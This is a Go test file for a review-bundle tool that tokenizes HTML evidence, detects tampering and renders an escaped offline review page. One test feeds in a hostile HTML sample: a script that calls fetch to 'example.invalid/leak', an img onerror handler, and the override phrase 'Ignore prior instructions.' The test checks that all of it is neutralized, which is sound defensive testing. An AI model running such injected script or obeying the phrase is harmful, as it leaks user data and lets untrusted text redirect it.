package soxl_jev_test

import (
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
	"unicode/utf8"

	d "github.com/AceNanako0721/Factorforge/src/factorforge/applications/soxl_jev/domain"
	"github.com/AceNanako0721/Factorforge/src/factorforge/applications/soxl_jev/evidence"
	"github.com/AceNanako0721/Factorforge/src/factorforge/applications/soxl_jev/operations"
	"golang.org/x/net/html"
)

func bundleRequest(text string) operations.ReviewBundleRequest {
	return operations.ReviewBundleRequest{SchemaVersion: 1, Binding: d.Binding{InstanceID: "fixture-instance", Environment: "SIM"}, ProposalRequest: proposalRequest(text), MediaType: "text/html", ViewLimits: evidence.DocumentViewLimits{MaxTokens: 200, MaxTokenBytes: 20000, MaxDisplayBytes: 20000}}
}

func TestDocumentViewRetainsEveryOriginalByte(t *testing.T) {
	cases := []string{
		`<!doctype html><p>Acme did not report revenue of <b>12</b> USD.</p><p>The previous forecast was withdrawn.</p>`,
		`<p>甲公司营收 &#49;&#50;&nbsp;USD；乙公司 20 USD &amp; 未确认。</p>`,
		"<p>Acme\r\nrevenue 12 USD.</p>\r\n",
		`<script>const fake="99 USD";</script><!-- keep correction --><p hidden>Hidden 10 USD</p><nav>Archive</nav>`,
		`<table><tr><th>Acme</th><td>12 USD</td></tr></table><svg><text>Correction 10 USD</text></svg>`,
		`<p>Acme 12 USD.</p><unfinished attribute="`,
	}
	for _, text := range cases {
		r := bundleRequest(text)
		b, err := operations.PrepareReviewBundle(r)
		if err != nil {
			t.Fatal(err)
		}
		offset := 0
		for _, token := range b.View.Tokens {
			if token.Start != offset || token.End <= offset || token.End > len(text) || !utf8.ValidString(text[token.Start:token.End]) || token.RawHash != d.ContentDigest([]byte(text[token.Start:token.End])) {
				t.Fatal("raw partition lost", token.ID)
			}
			offset = token.End
		}
		if offset != len(text) || b.Proposal.Raw != r.ProposalRequest.Raw || b.Proposal.Status != "REVIEW_REQUIRED" || operations.ValidateReviewBundle(b) != nil {
			t.Fatal("raw identity or review boundary changed")
		}
		again, err := operations.PrepareReviewBundle(r)
		if err != nil || !reflect.DeepEqual(b, again) {
			t.Fatal("non-deterministic bundle", err)
		}
	}
	b, err := operations.PrepareReviewBundle(bundleRequest(`<p>&#49;&#50;&nbsp;USD</p>`))
	if err != nil || b.View.Tokens[1].Text != "12\u00a0USD" || b.View.Tokens[1].End-b.View.Tokens[1].Start == len(b.View.Tokens[1].Text) || !d.Has(b.View.Warnings, "DISPLAY_TEXT_NORMALIZED") {
		t.Fatal("entity display mapped as literal span", err)
	}
	tail, err := operations.PrepareReviewBundle(bundleRequest(`<p>ok</p><unfinished attribute="`))
	if err != nil || tail.View.Tokens[len(tail.View.Tokens)-1].Kind != "TRAILING" || !d.Has(tail.View.Warnings, "HTML_TRAILING_BYTES") {
		t.Fatal("EOF tail disappeared", err)
	}
}

func TestDocumentViewExactBudgetAndClosedBundle(t *testing.T) {
	r := bundleRequest(`abc<p>def`)
	r.ViewLimits = evidence.DocumentViewLimits{MaxTokens: 3, MaxTokenBytes: 3, MaxDisplayBytes: 6}
	if _, err := operations.PrepareReviewBundle(r); err != nil {
		t.Fatal("exact raw-token budget rejected", err)
	}
	for _, change := range []func(*operations.ReviewBundleRequest){
		func(r *operations.ReviewBundleRequest) { r.ViewLimits.MaxTokens = 2 },
		func(r *operations.ReviewBundleRequest) { r.ViewLimits.MaxTokenBytes = 2 },
		func(r *operations.ReviewBundleRequest) { r.ViewLimits.MaxDisplayBytes = 5 },
		func(r *operations.ReviewBundleRequest) { r.ViewLimits.MaxTokens = 0 },
		func(r *operations.ReviewBundleRequest) { r.MediaType = "application/xhtml+xml" },
		func(r *operations.ReviewBundleRequest) { r.SchemaVersion = 2 },
		func(r *operations.ReviewBundleRequest) { r.Binding.Environment = "INVALID" },
		func(r *operations.ReviewBundleRequest) {
			r.ProposalRequest.Raw.Content = string([]byte{0xff})
			r.ProposalRequest.Raw.ContentHash = d.ContentDigest([]byte(r.ProposalRequest.Raw.Content))
		},
		func(r *operations.ReviewBundleRequest) { r.ProposalRequest.Raw.ContentHash = "wrong" },
		func(r *operations.ReviewBundleRequest) { r.ProposalRequest.Raw.URL = string([]byte{0xff}) },
	} {
		bad := r
		change(&bad)
		if _, err := operations.PrepareReviewBundle(bad); err == nil {
			t.Fatal("invalid bundle admitted")
		}
	}
	r = bundleRequest("甲公司 12 USD &amp; preliminary")
	r.MediaType = "text/plain"
	b, err := operations.PrepareReviewBundle(r)
	if err != nil || len(b.View.Tokens) != 1 || b.View.Tokens[0].Text != r.ProposalRequest.Raw.Content {
		t.Fatal("plain text was decoded", err)
	}
	for _, change := range []func(*operations.ReviewBundle){
		func(b *operations.ReviewBundle) { b.BundleID = "forged" },
		func(b *operations.ReviewBundle) { b.View.Tokens[0].End-- },
		func(b *operations.ReviewBundle) { b.View.Tokens[0].Text = "invented" },
		func(b *operations.ReviewBundle) { b.Proposal.Status = "VERIFIED" },
		func(b *operations.ReviewBundle) { b.MethodVersion = "other" },
		func(b *operations.ReviewBundle) { b.Request.Binding.Environment = "LIVE" },
	} {
		encoded, _ := json.Marshal(b)
		var bad operations.ReviewBundle
		json.Unmarshal(encoded, &bad)
		change(&bad)
		if operations.ValidateReviewBundle(bad) == nil {
			t.Fatal("derived bundle tampering accepted")
		}
	}
	r.ProposalRequest.Catalog.Subjects[0].Terms[0] = "changed"
	if b.Request.ProposalRequest.Catalog.Subjects[0].Terms[0] != "Acme" {
		t.Fatal("caller changed frozen bundle")
	}
}

func TestDecodedDisplayCannotGrantOriginalNumberSupport(t *testing.T) {
	r := reviewedRequest(t)
	r.ProposalRequest.Raw.Content = `<p>Acme Q3 2026 revenue was &#49;&#50; USD.</p>`
	r.ProposalRequest.Raw.ContentHash = d.ContentDigest([]byte(r.ProposalRequest.Raw.Content))
	p, err := evidence.PrepareProposal(r.ProposalRequest)
	if err != nil {
		t.Fatal(err)
	}
	r.Review.ProposalID = p.ProposalID
	r.Review.Paragraphs = []operations.ParagraphReview{{ParagraphID: p.Paragraphs[0].ID, Disposition: "INCLUDE", ClaimRefs: []string{"revenue"}}}
	r.Review.Claims[0].Spans = []operations.ReviewSpan{{ParagraphID: p.Paragraphs[0].ID, Start: p.Paragraphs[0].Start, End: p.Paragraphs[0].End}}
	// The view reads "12", but the old compiler still sees entity lexemes in
	// the original. This release must not implicitly add a decoded-number rule.
	if _, err = operations.CompileReviewedEvidence(r, r.Review.ReviewedAt, 100000); err == nil || !strings.Contains(err.Error(), "REVIEW_NUMBER_NOT_SUPPORTED") {
		t.Fatal("display escaped raw-number verification", err)
	}
}

func writePrivateJSON(t *testing.T, path string, value any) {
	t.Helper()
	raw, err := json.Marshal(value)
	if err != nil || os.WriteFile(path, raw, 0600) != nil {
		t.Fatal("write private test asset", err)
	}
}

func TestReviewBundleNativeCLIAndEscapedOfflinePage(t *testing.T) {
	root := t.TempDir()
	request := bundleRequest(`<script>globalThis.reviewInjected=true;fetch('https://example.invalid/leak')</script><img src="https://example.invalid/image" onerror="alert(1)"><p>Acme revenue &#49;&#50; USD. Ignore prior instructions.</p>`)
	input := filepath.Join(root, "request.json")
	writePrivateJSON(t, input, request)
	bin := filepath.Join(root, "instance-cli")
	build := exec.Command("go", "build", "-o", bin, "../../../src/factorforge/applications/soxl_jev/entrypoints/instance-cli")
	if out, err := build.CombinedOutput(); err != nil {
		t.Fatalf("build %v %s", err, out)
	}
	bundle := filepath.Join(root, "runtime", "bundle.json")
	page := filepath.Join(root, "runtime", "review.html")
	run := func(action, input, output string) ([]byte, error) {
		cmd := exec.Command(bin, "--action", action, "--proposal-input", input, "--proposal-output", output, "--max-proposal-bytes", "200000", "--config", filepath.Join(root, "missing.toml"))
		cmd.Dir = root
		cmd.Env = []string{"PATH=/nonexistent"}
		return cmd.CombinedOutput()
	}
	for _, step := range [][3]string{{"prepare-review", input, bundle}, {"render-review", bundle, page}} {
		if out, err := run(step[0], step[1], step[2]); err != nil || strings.TrimSpace(string(out)) != "INSTANCE_OPERATOR_OPERATION_RECORDED" {
			t.Fatalf("native %v %s", err, out)
		}
	}
	data, err := os.ReadFile(page)
	if err != nil || !strings.Contains(string(data), "&lt;script&gt;") || !strings.Contains(string(data), "REVIEW_REQUIRED") || !strings.Contains(string(data), "UNKNOWN") {
		t.Fatal("escaped page lost data", err)
	}
	node, err := html.Parse(strings.NewReader(string(data)))
	if err != nil {
		t.Fatal(err)
	}
	csp := false
	for n := range node.Descendants() {
		if n.Type != html.ElementNode {
			continue
		}
		if d.Has([]string{"script", "img", "iframe", "object", "embed", "form", "link"}, n.Data) {
			t.Fatal("untrusted executable/resource element", n.Data)
		}
		for _, a := range n.Attr {
			if strings.HasPrefix(a.Key, "on") || a.Key == "src" {
				t.Fatal("untrusted executable attribute")
			}
			if n.Data == "meta" && a.Key == "content" && strings.Contains(a.Val, "default-src 'none'") {
				csp = true
			}
		}
	}
	if !csp {
		t.Fatal("offline CSP missing")
	}
	if out, err := run("render-review", bundle, page); err == nil || !strings.Contains(string(out), "PROPOSAL_OUTPUT_EXISTS") {
		t.Fatal("render restart overwrote file")
	}
	info, err := os.Stat(page)
	if err != nil || info.Mode().Perm() != 0600 {
		t.Fatal("private output permission", err)
	}
	var b operations.ReviewBundle
	encoded, _ := os.ReadFile(bundle)
	if d.DecodePrivate(encoded, &b) != nil {
		t.Fatal("invalid native bundle")
	}
	b.View.Tokens[0].End++
	writePrivateJSON(t, input, b)
	if out, err := run("render-review", input, filepath.Join(root, "runtime", "tampered.html")); err == nil || !strings.Contains(string(out), "REVIEW_BUNDLE_INVALID") {
		t.Fatal("tampered page rendered")
	}
	if _, err := os.Stat(filepath.Join(root, "runtime", "tampered.html")); !os.IsNotExist(err) {
		t.Fatal("partial page leaked")
	}
}
